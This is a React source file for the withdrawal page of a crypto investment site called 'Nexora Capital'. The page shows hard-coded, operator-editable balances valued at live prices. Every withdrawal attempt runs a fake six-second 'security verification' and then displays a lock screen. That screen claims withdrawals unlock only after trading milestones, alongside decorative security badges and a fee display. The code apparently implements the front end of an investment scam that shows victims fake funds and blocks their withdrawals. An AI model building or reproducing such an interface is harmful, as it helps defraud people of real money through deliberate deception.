import { useState, useEffect, useCallback } from 'react';
import { useNavigate, Link } from 'react-router-dom';
// import logoUrl from '../assets/icons/logo.svg';
import Sidebar from '../components/Sidebar';
import {
    Search,
    User,
    Menu,
    CheckCircle2,
    ShieldCheck,
    Info,
    ChevronRight,
    Clock,
    LayoutGrid,
    Headphones,
    Lock
} from 'lucide-react';

interface Asset {
    id: string;
    symbol: string;
    name: string;
    image: string;
    network: string;
    min: number;
    max: number;
    color: string;
}

const assets: Asset[] = [
    {
        id: 'bitcoin',
        symbol: 'BTC',
        name: 'Bitcoin',
        image: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png',
        network: 'Bitcoin',
        min: 0.001,
        max: 2.0,
        color: '#f7931a'
    },
    {
        id: 'ethereum',
        symbol: 'ETH',
        name: 'Ethereum',
        image: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png',
        network: 'Ethereum',
        min: 0.01,
        max: 50.0,
        color: '#627eea'
    },
    {
        id: 'solana',
        symbol: 'SOL',
        name: 'Solana',
        image: 'https://assets.coingecko.com/coins/images/4128/large/solana.png',
        network: 'Solana',
        min: 1.0,
        max: 500.0,
        color: '#14f195'
    },
    {
        id: 'tether',
        symbol: 'USDT',
        name: 'Tether',
        image: 'https://assets.coingecko.com/coins/images/325/large/tether.png',
        network: 'TRC-20',
        min: 10.0,
        max: 100000.0,
        color: '#26a17b'
    }
];

// EDITABLE VALUES: Set the USD value for each coin here
// The system will automatically calculate the matching quantity based on live prices
const INITIAL_VALUES_USD: Record<string, number> = {
    BTC: 100.00,
    ETH: 100.00,
    USDT: 100.00,
    SOL: 100.00,
    BNB: 0.00
};

const WithdrawPage = () => {
    const navigate = useNavigate();
    const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
    const [selectedAsset, setSelectedAsset] = useState<Asset>(assets[0]);
    const [amount, setAmount] = useState('');
    const [address, setAddress] = useState('');
    const [prices, setPrices] = useState<Record<string, number>>({});
    const [isLoadingPrices, setIsLoadingPrices] = useState(true);
    const [currentTime, setCurrentTime] = useState(new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' }));
    const [isProcessing, setIsProcessing] = useState(false);
    const [showError, setShowError] = useState(false);

    // Dynamic Network Fee Logic
    const getNetworkFee = (symbol: string) => {
        const fees: Record<string, string> = {
            'BTC': '0.0004',
            'ETH': '0.0025',
            'SOL': '0.00005',
            'USDT': '1.00'
        };
        return fees[symbol] || '0.00';
    };

    const fetchPrices = useCallback(async () => {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,tether&vs_currencies=usd');
            if (!response.ok) throw new Error('Price fetch failed');
            const data = await response.json();

            // Persist for shared caching
            localStorage.setItem('nexora_simple_prices', JSON.stringify(data));

            setPrices({
                BTC: data.bitcoin?.usd || 0,
                ETH: data.ethereum?.usd || 0,
                SOL: data.solana?.usd || 0,
                USDT: data.tether?.usd || 0
            });
            setIsLoadingPrices(false);
        } catch (error) {
            console.error('Price API Error:', error);
            setPrices({
                BTC: 43000,
                ETH: 2300,
                SOL: 95,
                USDT: 1.00
            });
            setIsLoadingPrices(false);
        }
    }, []);

    useEffect(() => {
        const timer = setInterval(() => {
            setCurrentTime(new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' }));
        }, 1000);
        return () => clearInterval(timer);
    }, []);

    const handleWithdraw = () => {
        setIsProcessing(true);
        // Simulate institutional security verification delay
        setTimeout(() => {
            setIsProcessing(false);
            setShowError(true);
        }, 6000);
    };

    useEffect(() => {
        document.title = 'Secure Withdrawal | Nexora Capital';
        const key = sessionStorage.getItem('nexora_access_key');
        if (!key) {
            navigate('/');
            return;
        }

        // Bootstrap from cache to prevent blank states
        const cachedSimple = localStorage.getItem('nexora_simple_prices');
        const cachedMarket = localStorage.getItem('nexora_market_data');

        if (cachedSimple) {
            try {
                const data = JSON.parse(cachedSimple);
                setPrices({
                    BTC: data.bitcoin?.usd || 0,
                    ETH: data.ethereum?.usd || 0,
                    SOL: data.solana?.usd || 0,
                    USDT: data.tether?.usd || 0
                });
                setIsLoadingPrices(false);
            } catch (e) { console.error(e); }
        } else if (cachedMarket) {
            try {
                const parsed = JSON.parse(cachedMarket);
                if (Array.isArray(parsed)) {
                    const cachedPrices: Record<string, number> = {};
                    parsed.forEach((coin: any) => {
                        cachedPrices[coin.symbol.toUpperCase()] = coin.current_price;
                    });
                    setPrices(cachedPrices);
                    setIsLoadingPrices(false);
                }
            } catch (e) {
                console.error("Price bootstrap failed", e);
            }
        }

        fetchPrices();
    }, [navigate, fetchPrices]);

    const price = prices[selectedAsset.symbol] || 0;
    const availableBalance = price > 0 ? (INITIAL_VALUES_USD[selectedAsset.symbol] || 0) / price : 0;
    const fiatEstimate = amount ? parseFloat(amount) * price : 0;
    const isAmountValid = amount && parseFloat(amount) >= selectedAsset.min && parseFloat(amount) <= selectedAsset.max && parseFloat(amount) <= availableBalance;

    return (
        <div className="h-screen w-full bg-[#102217] text-white font-display overflow-hidden relative">
            {/* Mobile Sidebar Overlay */}
            {isMobileMenuOpen && (
                <div
                    className="fixed inset-0 bg-black/60 backdrop-blur-sm z-40 md:hidden animate-fade-in"
                    onClick={() => setIsMobileMenuOpen(false)}
                ></div>
            )}

            <style>
                {`
                    @media (max-width: 768px) {
                        input {
                            font-size: 16px !important;
                        }
                    }

                    /* Remove number input spinners */
                    input::-webkit-outer-spin-button,
                    input::-webkit-inner-spin-button {
                        -webkit-appearance: none;
                        margin: 0;
                    }

                    input[type=number] {
                        -moz-appearance: textfield;
                    }

                    @keyframes spin {
                        from { transform: rotate(0deg); }
                        to { transform: rotate(360deg); }
                    }

                    .spinner-border {
                        animation: spin 0.8s linear infinite;
                    }
                `}
            </style>

            <div className="flex h-full w-full flex-row">
                {!showError && (
                    <Sidebar
                        activePage="none"
                        isMobileMenuOpen={isMobileMenuOpen}
                        setIsMobileMenuOpen={setIsMobileMenuOpen}
                    />
                )}
                {showError && (
                    <div className="md:hidden">
                        <Sidebar
                            activePage="none"
                            isMobileMenuOpen={isMobileMenuOpen}
                            setIsMobileMenuOpen={setIsMobileMenuOpen}
                        />
                    </div>
                )}

                <main className="flex-1 flex flex-col h-full overflow-hidden relative bg-[#102217] w-full">
                    {showError ? (
                        <div className="h-full w-full bg-[#0a1410] relative overflow-y-auto animate-fade-in custom-scrollbar overflow-x-hidden">
                            {/* Background Radial Gradient - Fixed */}
                            <div className="fixed inset-0 bg-[radial-gradient(circle_at_50%_50%,#1a3328_0%,#0a1410_100%)] opacity-60 pointer-events-none"></div>

                            {/* Main Content - Centered Card Container */}
                            <div className="relative z-10 w-full min-h-full flex flex-col items-center justify-start py-12 md:py-24 px-[3%]">
                                <div className="max-w-[440px] w-full bg-[#121f19]/80 backdrop-blur-xl border border-white/5 rounded-[32px] md:rounded-[40px] shadow-[0_40px_100px_-20px_rgba(0,0,0,0.8)] overflow-hidden">
                                    {/* Upper Section */}
                                    <div className="flex flex-col items-center pt-8 md:pt-12 pb-6 md:pb-8 px-5 md:px-10 text-center gap-4 md:gap-6">
                                        <div className="w-[60px] h-[60px] md:w-20 md:h-20 rounded-full bg-orange-500/10 flex items-center justify-center relative shadow-[inset_0_0_20px_rgba(249,115,22,0.1)] border border-orange-500/10">
                                            <div className="absolute inset-0 rounded-full bg-gradient-to-b from-orange-500/5 to-transparent"></div>
                                            <div className="relative">
                                                <Lock className="text-orange-500 w-6 h-6 md:w-8 md:h-8" strokeWidth={1.5} />
                                                <Clock className="text-orange-500 absolute -bottom-1 -right-1 bg-[#121f19] rounded-full p-0.5 w-3.5 h-3.5 md:w-4 md:h-4" strokeWidth={2.5} />
                                            </div>
                                        </div>

                                        <div className="space-y-1 md:space-y-2">
                                            <h2 className="text-white text-[1.15rem] md:text-3xl font-bold tracking-tight">Withdrawal Restricted</h2>
                                            <div className="flex items-center justify-center gap-2">
                                                <div className="w-2 h-2 bg-orange-500 rounded-full shadow-[0_0_8px_#f97316]"></div>
                                                <span className="text-gray-500 text-[9px] md:text-[10px] uppercase font-black tracking-[0.2em]">Status: Locked</span>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Divider */}
                                    <div className="w-full h-px bg-white/5"></div>

                                    {/* Lower Section */}
                                    <div className="p-5 md:p-10 flex flex-col gap-6 md:gap-8 bg-black/10">
                                        <div className="space-y-2 md:space-y-4 text-center">
                                            <h3 className="text-white text-base md:text-xl font-bold">Withdrawals are currently unavailable</h3>
                                            <p className="text-gray-400/80 text-[0.85rem] md:text-[13px] leading-relaxed max-w-[340px] mx-auto font-normal">
                                                Elite investment accounts unlock withdrawals automatically after meeting performance criteria and trading volume milestones.
                                            </p>
                                        </div>

                                        {/* Protocol Box - Hidden or condensed on very small screens, here kept compact */}
                                        <div className="bg-black/40 border border-white/5 rounded-[20px] md:rounded-[24px] p-4 md:p-6 flex flex-col gap-2 relative overflow-hidden group">
                                            <div className="flex items-center gap-3">
                                                <div className="w-6 h-6 rounded-full bg-[#2bee79]/10 flex items-center justify-center">
                                                    <ShieldCheck className="text-[#2bee79]" size={14} />
                                                </div>
                                                <span className="text-white text-[9px] md:text-[10px] font-black uppercase tracking-[0.1em]">Protocol Enforced</span>
                                            </div>
                                            <p className="text-gray-500 text-[11px] md:text-[12px] leading-relaxed pl-9 font-normal">
                                                This restriction protects the integrity of the funded environment.
                                            </p>
                                        </div>

                                        {/* Button with Glow */}
                                        <div className="flex flex-col gap-4">
                                            <button
                                                onClick={() => navigate('/portfolio')}
                                                className="group relative w-full"
                                            >
                                                <div className="absolute inset-0 bg-[#2bee79] blur-2xl opacity-20 group-hover:opacity-40 transition-opacity"></div>
                                                <div className="relative h-14 md:h-16 bg-[#2bee79] text-[#102217] rounded-2xl md:rounded-3xl flex items-center justify-center gap-3 md:gap-4 font-black transition-transform hover:-translate-y-1 active:scale-95 duration-300">
                                                    <LayoutGrid className="fill-current w-[18px] h-[18px] md:w-[22px] md:h-[22px]" />
                                                    <span className="text-[12px] md:text-[14px] uppercase tracking-[0.1em]">Return to Portfolio</span>
                                                </div>
                                            </button>

                                            <button className="flex items-center gap-2 justify-center text-gray-500 hover:text-white transition-colors text-[10px] font-bold uppercase tracking-widest">
                                                <Headphones size={14} className="text-gray-600" />
                                                Priority Support
                                            </button>
                                        </div>
                                    </div>

                                    {/* Card Footer */}
                                    <div className="px-6 md:px-10 py-4 md:py-5 bg-black/20 flex items-center justify-between border-t border-white/5">
                                        <div className="flex items-center gap-2">
                                            <Lock className="text-gray-600 w-2.5 h-2.5 md:w-3 md:h-3" />
                                            <span className="text-[9px] text-gray-600 font-bold uppercase tracking-widest">TLS 1.3 Secure</span>
                                        </div>
                                        <div className="w-1.5 h-1.5 bg-[#2bee79] rounded-full shadow-[0_0_8px_#2bee79]"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    ) : (
                        <>
                            {/* Top Gradient Overlay */}
                            <div className="absolute top-0 left-0 w-full h-64 bg-gradient-to-b from-[#2bee79]/5 to-transparent pointer-events-none z-0"></div>

                            <div className="w-full flex-1 overflow-y-auto z-10 shadow-inner custom-scrollbar">
                                <div className="w-full flex flex-col gap-0 min-h-full">
                                    {/* Page Heading & Mobile Menu Trigger */}
                                    <header className="flex flex-col md:flex-row md:justify-between md:items-end gap-6 p-6 md:p-8 shrink-0 relative">
                                        <div className="flex flex-col gap-2">
                                            <div className="flex items-center justify-between md:justify-start gap-4">
                                                <div className="flex items-center gap-4">
                                                    <button
                                                        className="md:hidden p-2 -ml-2 rounded-xl text-white hover:bg-white/10 transition-colors bg-white/5 flex items-center justify-center"
                                                        onClick={() => setIsMobileMenuOpen(true)}
                                                    >
                                                        <Menu size={24} />
                                                    </button>

                                                    {/* Mobile Logo */}
                                                    <div className="md:hidden flex items-center justify-center">
                                                        <div className="h-9 w-9 relative flex items-center justify-center">
                                                            <img src="./assets/logo.svg" alt="Nexora" className="w-full h-full object-contain filter drop-shadow-[0_0_8px_rgba(43,238,121,0.3)]" />
                                                        </div>
                                                    </div>

                                                    <h2 className="text-white text-2xl md:text-3xl font-bold leading-tight tracking-tight">Secure Withdrawal</h2>
                                                </div>
                                            </div>
                                            <div className="flex items-center gap-2 text-gray-400 text-[11px] sm:text-sm font-medium">
                                                <ShieldCheck size={16} className="text-[#2bee79]/70 shrink-0" />
                                                <span className="truncate">Institutional Grade Analytics</span>
                                                <span className="mx-1 text-gray-600 shrink-0">•</span>
                                                <span id="current-time" className="shrink-0">UTC {currentTime}</span>
                                            </div>
                                        </div>

                                        {/* Header Actions */}
                                        <div className="hidden md:flex items-center gap-3 self-end md:self-auto">
                                            <Link
                                                to="/search"
                                                className="flex items-center justify-center w-10 h-10 md:w-12 md:h-12 rounded-full bg-white/5 border border-white/10 hover:border-[#2bee79]/50 text-gray-400 hover:text-[#2bee79] transition-all"
                                            >
                                                <Search size={20} />
                                            </Link>
                                            <Link
                                                to="/profile"
                                                className="flex items-center justify-center w-10 h-10 md:w-12 md:h-12 rounded-full bg-white/5 border border-white/10 hover:border-[#2bee79]/50 text-gray-400 hover:text-[#2bee79] transition-all relative"
                                            >
                                                <User size={20} />
                                                <div className="absolute top-2 right-2 w-2.5 h-2.5 bg-[#2bee79] rounded-full border-2 border-[#102217]"></div>
                                            </Link>
                                        </div>
                                    </header>

                                    <div className="px-4 md:px-8 pb-12 flex flex-col gap-14 relative z-10">
                                        {/* Asset Selection Grid - Constrained & Shrunk for Institutional Look */}
                                        <div className="max-w-[600px] w-full">
                                            <div className="grid grid-cols-4 gap-3 md:gap-4 shrink-0">
                                                {assets.map((asset) => (
                                                    <button
                                                        key={asset.symbol}
                                                        onClick={() => setSelectedAsset(asset)}
                                                        className={`relative w-full aspect-square md:w-32 md:h-32 flex flex-col items-center justify-center gap-2 p-3 rounded-2xl border transition-all active:scale-[0.95] ${selectedAsset.symbol === asset.symbol
                                                            ? 'bg-[#2bee79]/10 border-[#2bee79] shadow-[0_0_20px_rgba(43,238,121,0.2)]'
                                                            : 'bg-white/5 border-white/5 hover:border-white/10'
                                                            }`}
                                                    >
                                                        <div className="w-8 h-8 md:w-10 md:h-10 rounded-full bg-white/5 flex items-center justify-center p-1.5 overflow-hidden">
                                                            <img src={asset.image} alt={asset.name} className="w-full h-full object-contain" />
                                                        </div>
                                                        <span className={`text-[10px] md:text-xs font-black uppercase tracking-widest ${selectedAsset.symbol === asset.symbol ? 'text-[#2bee79]' : 'text-gray-400'}`}>
                                                            {asset.symbol}
                                                        </span>
                                                        {selectedAsset.symbol === asset.symbol && (
                                                            <div className="absolute top-2 right-2 flex items-center justify-center bg-[#2bee79] rounded-full p-0.5 shadow-[0_0_10px_rgba(43,238,121,0.5)]">
                                                                <CheckCircle2 size={10} className="text-[#102217]" strokeWidth={3} />
                                                            </div>
                                                        )}
                                                    </button>
                                                ))}
                                            </div>
                                        </div>

                                        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 items-start">
                                            {/* Left Column: Input Forms */}
                                            <div className="lg:col-span-2 flex flex-col gap-6">
                                                <div className="p-6 md:p-8 rounded-2xl bg-[#16261f] border border-white/5 shadow-2xl relative overflow-hidden flex flex-col gap-8">
                                                    {/* Amount Section with Fiat Estimation */}
                                                    <div className="flex flex-col gap-4">
                                                        <div className="flex justify-between items-end px-2">
                                                            <label className="text-[14px] font-medium uppercase tracking-[0.1em] text-gray-400">Withdrawal Amount</label>
                                                            <span className="text-[11px] font-bold text-gray-500 uppercase tracking-tight">
                                                                Holdings: <span className="text-white ml-1 font-mono">{selectedAsset.symbol === 'USDT' ? Math.floor(availableBalance).toLocaleString('en-US') : availableBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 })} {selectedAsset.symbol}</span>
                                                            </span>
                                                        </div>
                                                        <div className="relative group">
                                                            <input
                                                                type="number"
                                                                value={amount}
                                                                onChange={(e) => setAmount(e.target.value)}
                                                                placeholder="0.00"
                                                                className={`w-full bg-black/40 border focus:ring-1 rounded-xl h-12 px-5 text-[15px] font-medium tabular-nums transition-all placeholder-white/5 ${amount && parseFloat(amount) > availableBalance
                                                                    ? 'border-red-500/50 focus:border-red-500 focus:ring-red-500 text-red-200'
                                                                    : 'border-white/10 focus:border-[#10B981] focus:ring-[#10B981] text-gray-200'
                                                                    }`}
                                                            />
                                                            <div className="absolute right-5 top-1/2 -translate-y-1/2 flex items-center gap-3">
                                                                <span className="text-gray-500 font-medium text-sm uppercase tracking-tighter">{selectedAsset.symbol}</span>
                                                                <button
                                                                    onClick={() => {
                                                                        const formatted = selectedAsset.symbol === 'USDT'
                                                                            ? Math.floor(availableBalance).toString()
                                                                            : availableBalance.toFixed(6);
                                                                        setAmount(formatted);
                                                                    }}
                                                                    className="h-7 px-2.5 rounded-lg bg-[#2bee79]/10 text-[#2bee79] text-[9px] font-black uppercase hover:bg-[#2bee79]/20 transition-all border border-[#2bee79]/20"
                                                                >
                                                                    Max
                                                                </button>
                                                            </div>
                                                        </div>

                                                        {/* Insufficient Funds Warning */}
                                                        {amount && parseFloat(amount) > availableBalance && (
                                                            <div className="flex items-center gap-2 px-2 animate-fade-in">
                                                                <span className="text-[#EF4444] text-[12px] font-bold flex items-center gap-1.5 uppercase tracking-wide">
                                                                    ⚠️ Insufficient Balance (Max: {selectedAsset.symbol === 'USDT' ? Math.floor(availableBalance).toLocaleString('en-US') : availableBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 })})
                                                                </span>
                                                            </div>
                                                        )}
                                                        <div className="flex items-center gap-3 px-4 py-1.5 rounded-lg bg-white/[0.02] border border-white/5 self-start transition-all duration-500">
                                                            <span className="text-[11px] md:text-xs text-gray-500 font-medium tracking-tight">
                                                                Market Equivalent: <span className="text-gray-300 ml-1">≈ ${fiatEstimate.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD</span>
                                                            </span>
                                                            {isLoadingPrices && (
                                                                <div className="w-2.5 h-2.5 border-2 border-[#2bee79]/20 border-t-[#2bee79] rounded-full animate-spin"></div>
                                                            )}
                                                        </div>
                                                    </div>

                                                    {/* Destination Address */}
                                                    <div className="flex flex-col gap-4">
                                                        <label className="text-[14px] font-medium uppercase tracking-[0.1em] text-gray-400 px-2">Destination {selectedAsset.network} Address</label>
                                                        <div className="relative">
                                                            <input
                                                                type="text"
                                                                value={address}
                                                                onChange={(e) => setAddress(e.target.value)}
                                                                placeholder={`Paste protocol address...`}
                                                                className="w-full bg-black/40 border border-white/10 focus:border-[#10B981] focus:ring-1 focus:ring-[#10B981] rounded-xl h-12 px-5 font-mono text-[14px] text-gray-200 transition-all placeholder-white/5 tracking-wider"
                                                            />
                                                            <div className="absolute right-4 top-1/2 -translate-y-1/2 p-2 text-[#2bee79]/20">
                                                                <ShieldCheck size={18} />
                                                            </div>
                                                        </div>
                                                    </div>

                                                    {/* Security Box - Compact */}
                                                    <div className="flex gap-4 p-4 rounded-xl bg-amber-500/5 border border-amber-500/10">
                                                        <Info size={16} className="text-amber-500 shrink-0 mt-0.5" />
                                                        <div className="flex flex-col gap-0.5">
                                                            <h4 className="text-[11px] font-bold text-amber-500 uppercase tracking-widest">Network Verification</h4>
                                                            <p className="text-[11px] text-gray-500 leading-relaxed font-medium">
                                                                Funds routed via <span className="text-gray-300 font-bold">{selectedAsset.network}</span>. Ensure address accuracy to prevent asset loss.
                                                            </p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                            {/* Right Column: Review & Ledger */}
                                            <div className="lg:col-span-1 flex flex-col gap-6 h-full">
                                                <div className="p-6 md:p-8 rounded-2xl bg-[#16261f] border border-white/5 flex flex-col justify-between shadow-xl relative overflow-hidden group h-full">
                                                    {/* Background Polish */}
                                                    <div className="absolute -right-10 -top-10 w-32 h-32 bg-[#2bee79]/5 blur-[60px] rounded-full pointer-events-none group-hover:bg-[#2bee79]/10 transition-all duration-1000"></div>

                                                    <div className="flex flex-col gap-5 relative z-10 flex-1">
                                                        <h3 className="text-[11px] font-bold uppercase tracking-[0.2em] text-[#2bee79]/70">Terminal Summary</h3>

                                                        <div className="flex items-center gap-4 py-2">
                                                            <div className="w-9 h-9 rounded-full bg-white/5 flex items-center justify-center p-2 shadow-sm border border-white/5">
                                                                <img src={selectedAsset.image} alt={selectedAsset.name} className="w-full h-full object-contain filter grayscale brightness-125" />
                                                            </div>
                                                            <div className="flex flex-col">
                                                                <p className="text-[14px] font-medium tracking-tight text-gray-200">{selectedAsset.name}</p>
                                                                <p className="text-[9px] text-gray-500 font-bold uppercase tracking-[0.1em]">{selectedAsset.network} Node</p>
                                                            </div>
                                                        </div>

                                                        <div className="bg-black/20 rounded-xl border border-white/5 p-4 space-y-4">
                                                            <div className="flex justify-between items-center">
                                                                <span className="text-[11px] uppercase tracking-wider text-gray-500 font-bold">Protocol</span>
                                                                <span className="text-[13px] font-mono text-gray-300 uppercase">{selectedAsset.symbol}</span>
                                                            </div>
                                                            <div className="h-px border-t border-dashed border-white/10 w-full opacity-50"></div>
                                                            <div className="flex justify-between items-center">
                                                                <span className="text-[11px] uppercase tracking-wider text-gray-500 font-bold">Dest. Address</span>
                                                                <span className="text-[13px] font-mono text-gray-400 truncate max-w-[120px]">{address || '0x...'}</span>
                                                            </div>
                                                            <div className="h-px border-t border-dashed border-white/10 w-full opacity-50"></div>
                                                            <div className="flex justify-between items-center">
                                                                <span className="text-[11px] uppercase tracking-wider text-gray-500 font-bold">Amount</span>
                                                                <span className="text-[14px] font-medium text-[#2bee79]">
                                                                    {amount ? (selectedAsset.symbol === 'USDT' ? Math.floor(parseFloat(amount)).toLocaleString('en-US') : parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 6 })) : '0.00'} {selectedAsset.symbol}
                                                                </span>
                                                            </div>
                                                            <div className="h-px border-t border-dashed border-white/10 w-full opacity-50"></div>
                                                            <div className="flex justify-between items-center">
                                                                <span className="text-[11px] uppercase tracking-wider text-gray-500 font-bold">Network Fee</span>
                                                                <div className="flex flex-col items-end">
                                                                    <span className="text-[13px] font-mono text-[#2bee79]">{getNetworkFee(selectedAsset.symbol)} {selectedAsset.symbol}</span>
                                                                    <span className="text-[9px] text-gray-600 font-bold uppercase tracking-tighter">Blockchain Surcharge</span>
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-white/[0.02] border border-white/5 mt-2">
                                                            <ShieldCheck size={14} className="text-[#2bee79]/40" />
                                                            <span className="text-[10px] text-gray-600 font-bold uppercase tracking-[0.1em]">Signed via NEX-ENG 2.0</span>
                                                        </div>
                                                    </div>

                                                    <div className="mt-8">
                                                        <button
                                                            onClick={handleWithdraw}
                                                            disabled={!isAmountValid || !address || parseFloat(amount) > availableBalance || isProcessing}
                                                            className={`w-full h-12 rounded-xl font-bold text-[11px] uppercase tracking-[0.2em] transition-all flex items-center justify-center gap-3 relative z-10 ${isAmountValid && address && parseFloat(amount) <= availableBalance && !isProcessing
                                                                ? 'bg-[#2bee79] text-[#102217] shadow-[0_4px_20px_rgba(43,238,121,0.2)] hover:bg-[#3af585] active:scale-[0.98]'
                                                                : isProcessing
                                                                    ? 'bg-[#2bee79]/20 text-[#2bee79] cursor-wait'
                                                                    : 'bg-white/5 text-gray-600 cursor-not-allowed opacity-20 border border-white/5'
                                                                }`}
                                                        >
                                                            {isProcessing ? (
                                                                <>
                                                                    <div className="w-4 h-4 border-2 border-[#2bee79]/20 border-t-[#2bee79] rounded-full spinner-border"></div>
                                                                    Securing Transaction...
                                                                </>
                                                            ) : (
                                                                <>
                                                                    Process Withdrawal
                                                                    <ChevronRight size={14} />
                                                                </>
                                                            )}
                                                        </button>
                                                    </div>
                                                </div>

                                                <div className="flex flex-col items-center gap-4 py-4">
                                                    <div className="flex items-center gap-2 px-4 py-2 rounded-full bg-white/5 border border-white/5">
                                                        <ShieldCheck size={14} className="text-[#2bee79]" />
                                                        <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest leading-none">Institutional Encryption Protocol</span>
                                                    </div>
                                                    <p className="text-[10px] text-gray-700 font-bold uppercase tracking-tighter">Powered by Nexora Secure Engine v2.0</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </>
                    )}
                </main>
            </div>
        </div>
    );
};

export default WithdrawPage;
